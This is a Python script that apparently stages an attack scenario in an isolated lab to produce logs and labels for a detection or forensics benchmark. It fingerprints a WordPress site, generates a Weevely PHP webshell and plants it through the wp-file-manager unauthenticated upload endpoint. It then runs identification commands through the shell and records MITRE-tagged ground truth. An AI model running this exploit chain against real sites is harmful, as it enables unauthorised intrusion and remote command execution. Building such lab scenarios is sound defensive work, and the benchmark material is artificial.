"""Run the s01 attack inside the private attacker container."""

from __future__ import annotations

import argparse
import json
import os
import socket
import subprocess
import sys
import tempfile
import time
from datetime import UTC, datetime, timedelta
from pathlib import Path

import requests

sys.path.insert(0, "/opt/v2")

EDGE = "http://edge"
ATTACKER_IP = "192.0.2.131"
UPLOAD_STEP = "unauthenticated_file_upload"
AGENT_NAME = "maintenance-agent.php"
AGENT_PASSWORD = os.environ["BENCH_AGENT_PASSWORD"]
AGENT_URL = f"{EDGE}/wp-content/plugins/wp-file-manager/lib/files/{AGENT_NAME}"


def timestamp() -> str:
    return datetime.now(UTC).isoformat(timespec="microseconds")


def timestamp_offset(value: datetime, milliseconds: int) -> str:
    return (value + timedelta(milliseconds=milliseconds)).isoformat(timespec="microseconds")


def isolate() -> None:
    from background import target_url

    try:
        target_url("/", "outside-lab")
    except ValueError:
        print("non_allowlisted_service_refused=PASS")
    else:
        raise SystemExit("non_allowlisted_service_refused=FAIL")
    try:
        with socket.create_connection(("1.1.1.1", 443), timeout=2):
            raise SystemExit("external_address_unreachable=FAIL")
    except OSError:
        print("external_address_unreachable=PASS")


def perform_attack() -> None:
    ready = Path("/replay/background-halfway")
    continuation = Path("/replay/background-continue")
    for _ in range(180000):
        if ready.exists():
            break
        time.sleep(0.05)
    else:
        raise TimeoutError("background replay did not reach its seeded attack point")

    from pacing import install_hand_pacing

    install_hand_pacing(5001, scanner=False)
    records: dict[str, object] = {
        "scenario_id": "s01",
        "description": (
            "A remote user checks the WordPress and file-manager versions, makes a few "
            "routine probes, then abuses the unauthenticated upload and runs three "
            "identification commands through the uploaded agent. Background visitors and "
            "scanners reach the same application from separate client addresses."
        ),
        "attacker_ips": [ATTACKER_IP],
        "root_cause_step": UPLOAD_STEP,
        "steps": [],
        "files": [
            {
                "path": f"/wp-content/plugins/wp-file-manager/lib/files/{AGENT_NAME}",
                "role": "webshell_agent",
            },
            {
                "path": "/wp-content/uploads/wp-file-manager-pro/fm_backup/index.php",
                "role": "side_effect",
                "expected_in_report": False,
            },
        ],
        "analysis": {
            "access_logs": ["access.log.gz"],
            "error_logs": ["app-error.log"],
            "error_log_format": "apache",
            "error_log_utc_offset": "+0000",
            "manifest": "manifest.tsv",
            "baseline": "baseline.tsv",
            "trusted_proxies": [],
        },
        "split": "dev",
        "expected_rule_ids": [],
    }
    steps: list[dict[str, object]] = []
    # Reconnaissance is deliberately marked outside the expected incident timeline.
    for step_id, path in (
        ("site_check", "/"),
        ("plugin_version_check", "/wp-content/plugins/wp-file-manager/readme.txt"),
        ("admin_probe", "/wp-admin/"),
        ("xmlrpc_probe", "/xmlrpc.php"),
    ):
        response = requests.get(
            f"{EDGE}{path}",
            headers={"X-Lab-Step": step_id},
            timeout=10,
            allow_redirects=False,
        )
        steps.append(
            {
                "id": step_id,
                "category": "reconnaissance",
                "mitre": ["T1595"],
                "label_method": "header",
                "expected_in_timeline": False,
            }
        )
    with tempfile.TemporaryDirectory(prefix="s01-agent-") as temporary:
        agent = Path(temporary) / AGENT_NAME
        subprocess.run(
            ["weevely", "generate", AGENT_PASSWORD, str(agent)],
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
        )
        with agent.open("rb") as handle:
            response = requests.post(
                f"{EDGE}/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php",
                data={"cmd": "upload", "target": "l1_Lw"},
                files={"upload[]": (AGENT_NAME, handle, "application/octet-stream")},
                headers={"X-Lab-Step": UPLOAD_STEP},
                timeout=15,
                allow_redirects=False,
            )
        ended_at = timestamp()
        if response.status_code != 200:
            raise RuntimeError(f"upload request returned HTTP {response.status_code}")
        try:
            upload_result = response.json()
        except ValueError as exc:
            raise RuntimeError("upload response was not JSON") from exc
        if "added" not in upload_result:
            raise RuntimeError("upload response did not confirm a new file")
        steps.append(
            {
                "id": UPLOAD_STEP,
                "category": "unrestricted_upload",
                "mitre": ["T1190"],
                "label_method": "header",
                "expected_in_timeline": True,
            }
        )

        for step_id, command in (
            ("agent_identity", "id"),
            ("agent_working_directory", "pwd"),
            ("agent_user", "whoami"),
        ):
            command_started_at = timestamp()
            result = subprocess.run(
                ["weevely", AGENT_URL, AGENT_PASSWORD, command],
                check=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                timeout=15,
            )
            command_ended = datetime.now(UTC)
            ended_at = command_ended.isoformat(timespec="microseconds")
            if not result.stdout.strip():
                raise RuntimeError(f"Weevely returned no output for {step_id}")
            steps.append(
                {
                    "id": step_id,
                    "category": "webshell_command",
                    "mitre": ["T1059.004"],
                    "label_method": "attacker_ip_time_window",
                    "attacker_ip": ATTACKER_IP,
                    "started_at": command_started_at,
                    "ended_at": ended_at,
                    "command_started_at": command_started_at,
                    "command_ended_at": ended_at,
                    "request": (
                        "POST /wp-content/plugins/wp-file-manager/lib/files/maintenance-agent.php "
                        "HTTP/1.1"
                    ),
                    "status": 200,
                    "candidate_ordinal": 1,
                }
            )

    continuation.write_text("continue\n", encoding="ascii")
    records["steps"] = steps
    Path("/replay/records.json").write_text(
        json.dumps(records, ensure_ascii=False, indent=2) + "\n", encoding="utf-8"
    )
    print(json.dumps({"attack_completed": True, "steps": len(steps)}, sort_keys=True))


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("action", choices=("isolation", "attack"))
    args = parser.parse_args()
    if args.action == "isolation":
        isolate()
    else:
        perform_attack()


if __name__ == "__main__":
    main()
